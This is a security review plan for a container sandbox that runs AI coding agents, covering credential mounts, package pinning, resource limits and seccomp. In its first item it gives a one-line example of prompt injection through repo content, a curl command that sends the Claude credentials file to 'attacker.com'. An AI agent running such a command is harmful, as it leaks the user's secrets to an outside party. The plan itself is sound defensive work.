# aisb security & efficacy plan

Findings from a review of the repo at commit `c9f8eab`. Each item has a
severity, the concrete change, and acceptance criteria. Ordering is roughly
by impact, not effort.

Driving requirements:
- Users must not need to re-authenticate every time a new container is spawned.
- Claude/Codex/pi logs, plans, settings, and session history must survive
  container removal and image rebuilds.
- The security goal is therefore not "no persistent host state"; it is to
  separate long-lived credentials from ordinary writable runtime state, and to
  make credential mutation intentional.

## P0 — threat model and doc

### 1. Document what the sandbox does *not* protect

**Problem.** README's "Hardening" section describes host-protection mechanics
but omits the in-container exposure: the agent has live API keys, OAuth
tokens, `GH_TOKEN`, and unrestricted network egress. A prompt-injection via
repo content → `curl attacker.com -d @~/.claude/.credentials.json` is a
one-liner. Users may assume "hardened sandbox" means more than it does.

**Fix.** Add a "What this does not protect against" paragraph to README.md
covering:
- credentials exposed inside the container (auth files, env-var API keys,
  `GH_TOKEN` / `~/.config/gh` mount)
- full network egress — any compromise can exfil
- the mounted repo is RW; an agent can push malicious commits
- `--dangerously-skip-permissions` / `--dangerously-bypass-approvals-and-sandbox`
  shift all behavioral safety onto model alignment

**Accept when.** README clearly separates "host protection" from "agent-side
trust assumptions."

---

## P1 — supply chain

### 2. Pin npm agent packages to the resolved version in the install command

**Problem.** `Containerfile.codex:6` and `Containerfile.pi:6` run
`npm install -g …@latest`. `bin/build-containers` captures the current
version into a build-arg (`CODEX_VERSION`, `PI_VERSION`) but only uses it
as a cache-key; the `npm install` itself still resolves `@latest` at build
time. There is a TOCTOU window between `npm view` and `npm install` where
a malicious publish would be picked up silently.

**Fix.** Install the exact version:

```dockerfile
# Containerfile.codex
ARG CODEX_VERSION=unknown
RUN npm install -g "@openai/codex@${CODEX_VERSION}"
```

Same for `Containerfile.pi`. `build-containers` already resolves the
version — reuse it.

**Accept when.** Both Containerfiles interpolate `${…_VERSION}` into the
install command; `build-containers` fails loudly if version resolution
returned `unknown`.

### 3. Pin the base image and verify the Node.js tarball

**Problem.** `Containerfile.base:1` uses `fedora-minimal:43` (floating
tag). Line 23 pipes the Node tarball through `tar` without verifying
sha256. Line 27 runs `curl | sh` for uv.

**Fix.**
- Pin the base by digest: `FROM registry.fedoraproject.org/fedora-minimal@sha256:<digest>`.
  Add a comment recording which Fedora release that maps to.
- Verify the Node tarball against the published `SHASUMS256.txt`:
  ```dockerfile
  RUN curl -fsSLO https://nodejs.org/dist/v24.13.1/node-v24.13.1-linux-x64.tar.xz \
   && curl -fsSL https://nodejs.org/dist/v24.13.1/SHASUMS256.txt \
      | grep 'node-v24.13.1-linux-x64.tar.xz' | sha256sum -c - \
   && tar -xJ --strip-components=1 -C /usr/local -f node-v24.13.1-linux-x64.tar.xz \
   && rm node-v24.13.1-linux-x64.tar.xz
  ```
- uv installer: accept the `curl | sh` as standard practice, or download
  the binary release and verify its sha256 from Astral's published sums.

**Accept when.** `podman build` is reproducible for a given Containerfile,
and a tampered tarball/digest fails the build.

### 4. Note the claude installer is `curl | bash`

**Problem.** `Containerfile.claude:10` — `curl -fsSL https://claude.ai/install.sh | bash`.
Standard, but worth flagging.

**Fix.** Lower priority; either accept and comment in the Containerfile,
or switch to the npm package `@anthropic-ai/claude-code` with a pinned
version (same pattern as #2).

**Accept when.** Decision is documented in-file.

---

## P1 — mount / credential handling

### 5. Split persistent auth from writable runtime state

**Problem.** The wrappers need persistent host state so users do not
re-authenticate every run and so agent logs/plans survive image wipes. Today
that persistence is too coarse-grained: `run-claude:78-80`, `run-codex:97`,
and the `gh` config mount expose long-lived auth/config as writable mounts in
normal repo sessions. A prompt injection or malicious repo script can therefore
modify or corrupt future auth/config, not just read the credentials available
to the current run.

**Fix.** Preserve persistent auth and persistent logs/plans, but split them:
- **Normal runs:** long-lived auth/config is read-only where the CLI supports
  it. If a CLI cannot run with read-only auth, copy the minimum auth/config
  files into the tmpfs home at container startup and write durable runtime
  state somewhere else.
- **Durable per-repo state:** logs, plans, sessions, model caches, and other
  mutable agent state live under `$XDG_STATE_HOME/aisb/<agent>/$HASH/` (or
  `$XDG_CACHE_HOME/aisb/<agent>/$HASH/` for caches), mounted writable. This
  state survives container/image deletion without giving the container write
  access to global credentials.
- **Auth refresh mode:** provide an explicit opt-in mode, e.g.
  `AISB_AUTH_WRITE=1` or wrapper-specific `CLAUDE_AUTH_WRITE=1` /
  `CODEX_AUTH_WRITE=1`, that temporarily mounts the relevant host auth path
  writable for `login`, token refresh, or first-time setup. In this mode,
  consider not mounting the repo, or mounting it read-only.
- **GitHub auth:** prefer forwarding `GH_TOKEN` / `GITHUB_TOKEN` when present.
  If mounting `~/.config/gh`, mount it read-only for normal runs and writable
  only in auth-refresh mode.

**Implementation note.** The "copy auth into tmpfs at startup" fallback
cannot be done from the host wrapper — the destination is inside the
container's tmpfs, which doesn't exist until `podman run` starts. This
requires a small entrypoint shim baked into each flavor's Containerfile
that runs before the agent CLI, roughly:

```bash
# /usr/local/bin/aisb-entrypoint (example for claude)
set -euo pipefail
if [[ -r /aisb-auth/.credentials.json ]]; then
  install -m 0600 /aisb-auth/.credentials.json "$HOME/.claude/.credentials.json"
fi
# …copy other auth/config files…
exec claude "$@"
```

The wrapper then mounts the host auth path at `/aisb-auth` read-only, and
the CLI writes its mutable runtime state (session history, logs) to the
writable per-repo mount. In `AISB_AUTH_WRITE=1` mode, skip the copy and
bind-mount the host auth path directly at the CLI's expected location.

**Accept when.**
- A normal `claude` / `codex` / `pi` run reuses existing auth without prompting
  for login.
- A normal run can persist logs/plans/session state across container removal
  and image rebuilds.
- A normal run cannot modify host credential files such as
  `~/.claude/.credentials.json`, `~/.claude.json`, `~/.codex/auth.json`, or
  `~/.config/gh/*`.
- An explicit auth-write mode exists and can refresh/login successfully.

### 5b. Use private SELinux labels where compatible

**Problem.** Auth/config mounts currently use `:z` (shared relabel). Shared
labels are convenient for concurrent containers but reduce SELinux separation
between containers that can access the same host paths.

**Fix.** After #5 splits read-only auth from writable runtime state, use
private `:Z` labels for non-shared auth/config mounts where compatible. Keep
`:z` only for mounts that are intentionally shared across concurrent
containers, such as the repo bind if simultaneous sessions are expected. If
`:Z` causes concurrent auth-reader conflicts on the same file, prefer copying
auth into tmpfs over falling back to writable shared auth mounts.

**Accept when.** Mount labels are chosen deliberately:
- repo mounts may use `:z`
- per-run/per-repo private state may use `:Z`
- auth/config mounts are read-only or tmpfs-copied in normal mode, with `:Z`
  used where it does not break required concurrency

### 6. Move `run-codex` workspace caches out of the repo

**Problem.** `run-codex:25-38` creates `$ROOT/.cache`, `$ROOT/.local/state`,
`$ROOT/.venv`, `$ROOT/.uv-cache`, `$ROOT/.uv-python`, `$ROOT/.pytest_cache`
in the user's repo. None are gitignored. Easy to accidentally commit, and
inconsistent with `run-claude` / `run-pi` which use `$XDG_STATE_HOME/claude-podman`.

**Fix.** Prefer option A; fall back to B if codex genuinely needs
repo-local paths:
- **A.** Move all six dirs under `$XDG_STATE_HOME/claude-podman/codex/$HASH/…`,
  matching the pattern in `run-claude` / `run-pi`.
- **B.** Keep them repo-local but auto-append each path to `.git/info/exclude`
  on first run (so they're ignored without dirtying `.gitignore`).

Re-check why the comment on line 24 says "so codex's internal sandbox can
use uv/pytest without overrides" — the container IS the sandbox, and
codex's sandbox is bypassed via `--dangerously-bypass-approvals-and-sandbox`,
so the constraint may no longer apply.

**Accept when.** `git status` in a freshly-run codex session shows no new
untracked entries in the repo root.

---

## P2 — resource limits and blast radius

### 7. Add resource caps to every wrapper

**Problem.** None of `run-claude`, `run-codex`, `run-pi`, `run-sb` set
`--memory`, `--cpus`, or `--pids-limit`. A runaway agent (or a forked
build) can OOM the host or fork-bomb.

**Fix.** Add sensible defaults, overridable via env var:

```bash
: "${AISB_MEMORY:=8g}"
: "${AISB_CPUS:=4}"
: "${AISB_PIDS:=1024}"

podman run … \
  --memory="$AISB_MEMORY" \
  --cpus="$AISB_CPUS" \
  --pids-limit="$AISB_PIDS" \
  …
```

Document the env vars in the README's "Per-wrapper overrides" table.

**Accept when.** All four wrappers pass the three flags, and overriding
each via env var works.

### 8. Optional: offer a `--network=none` mode

**Problem.** Agents need network for API calls and package installs, so
blanket network isolation isn't viable. But for one-shot `sb` invocations
(e.g., running an untrusted script), `--network=none` would dramatically
reduce exfil risk.

**Fix.** Add `AISB_NO_NETWORK=1` support to `run-sb` that injects
`--network=none`. Leave agent wrappers as-is (they need network). Mention
in the README.

**Accept when.** `AISB_NO_NETWORK=1 sb curl example.com` fails with a
network error.

---

## P2 — consistency

### 9. Align auth-mount flags across wrappers

**Problem.** `run-codex` uses `noexec` on its auth mount
(`-v "$HOME/.codex":/home/codex/.codex:nosuid,nodev,noexec,z`). Others
don't. Credentials should never be executed regardless of agent.

**Fix.** Add `noexec` to every auth/config/secret bind mount in all four
wrappers. (Not the repo mount — scripts there are legitimately executed.)

**Accept when.** Every auth/config/secret bind mount carries
`nosuid,nodev,noexec` where compatible. Do not apply this blindly to venv,
tool, or cache mounts that may legitimately need executable files.

### 10. Reconcile per-repo vs. global state between agents

**Problem.** `run-claude` and `run-pi` scope state to `$HASH` (per-repo).
`run-codex` mounts `~/.codex` globally. The rationale (codex auth is a
shared OAuth token) is plausible but undocumented.

**Fix.** Add a one-line comment in `run-codex` explaining the global mount
is intentional (shared OAuth). If you want parity, split codex's auth
(global) from session state (per-repo), but that requires knowing codex's
file layout.

**Accept when.** The codex wrapper makes its scoping choice explicit in a
comment.

---

## P3 — nits

### 11. `$BASE` in container name is attacker-influenced

**Problem.** `NAME="claude-${BASE}-${HASH}-${STAMP}-$$"` interpolates
`basename $ROOT`. If the repo name contains characters podman's `--name`
dislikes, the run fails. Not a security issue (no shell eval), just a
robustness one.

**Fix.** Sanitize: `BASE="$(basename "$ROOT" | tr -c 'A-Za-z0-9._-' '_')"`.

**Accept when.** A repo named `foo bar!` produces a valid container name.

### 12. `install.sh`: don't overwrite non-symlink targets

**Problem.** `ln -sfn "$target" "$link"` will happily replace an existing
regular file at `$link`. Unlikely but surprising.

**Fix.**
```sh
if [[ -e "$link" && ! -L "$link" ]]; then
  echo "refuse: $link exists and is not a symlink" >&2
  continue
fi
ln -sfn "$target" "$link"
```

**Accept when.** Running `install.sh` over a pre-existing non-symlink
file at `~/.local/bin/claude` errors cleanly.

### 13. `.envrc` is referenced in README but deleted in the worktree

**Problem.** README lists `.envrc` in the file table and in the
"Environment" section. The file is tracked in `HEAD`, but currently deleted
in the worktree. It also contains real `pass show` paths rather than being
clearly marked as a local example.

**Fix.** Either restore it as `.envrc.example` (with pass paths shown as an
example) and update README to say users write their own `.envrc`, or restore
the tracked `.envrc` if this repo intentionally ships that exact direnv
configuration.

**Accept when.** `git status` no longer shows `D .envrc`, and README no
longer implies that a local secrets-loading file must be present in every
checkout.

### 14. Consider a tighter seccomp profile

**Problem.** Default podman seccomp is applied, which is fine given
`--cap-drop=all` and `--security-opt no-new-privileges`. Lower-priority
defense in depth.

**Fix.** Optional: ship a `seccomp.json` that additionally blocks
`ptrace`, `bpf`, `keyctl`, `perf_event_open`, mount/umount family.
Wire via `--security-opt seccomp=./seccomp.json`.

**Accept when.** An opt-in env var (`AISB_STRICT_SECCOMP=1`) enables it
and the agents still run normally.

### 15. Verify `--tmpfs size=` caps actually constrain RAM

**Problem.** tmpfs sizing bounds the filesystem size, which effectively
bounds RAM use from `/tmp` etc. But a malicious process can still allocate
heap up to whatever the host has. Related to #7.

**Fix.** Covered by #7's `--memory` cap.

**Accept when.** #7 is done.

---

## Sequencing suggestion

1. **This afternoon (docs + pins, no behavior change):** #1, #2, #13.
2. **Next session (behavior changes, test each wrapper end-to-end):** #5,
   #5b, #6, #7, #9.
3. **Later:** #3, #4, #8, #10, #11, #12, #14.
